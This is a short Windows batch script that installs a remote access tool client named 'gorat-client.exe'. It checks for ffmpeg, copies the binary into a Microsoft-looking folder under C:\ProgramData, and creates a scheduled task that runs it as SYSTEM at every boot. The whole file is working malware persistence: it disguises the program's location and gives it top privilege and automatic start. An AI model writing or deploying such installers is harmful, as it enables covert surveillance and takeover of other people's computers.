@echo off

set APP_NAME=gorat-client.exe
set APP_PATH=C:\ProgramData\Microsoft\Windows\%APP_NAME%

where ffmpeg >nul 2>nul
if %errorlevel% neq 0 (
    echo Error: ffmpeg not found, please install ffmpeg and add to system PATH
    pause
    exit /b 1
)

copy /Y %APP_NAME% %APP_PATH%
if %errorlevel% neq 0 (
    echo Error: Cannot copy executable, please run as administrator
    pause
    exit /b 1
)

schtasks /create /tn "GoRATClient" /tr "%APP_PATH%" /sc onstart /ru SYSTEM /f
if %errorlevel% neq 0 (
    echo Error: Cannot create scheduled task, please run as administrator
    pause
    exit /b 1
)

start "" %APP_PATH%
echo Installation complete! Service started and enabled on boot.
pause
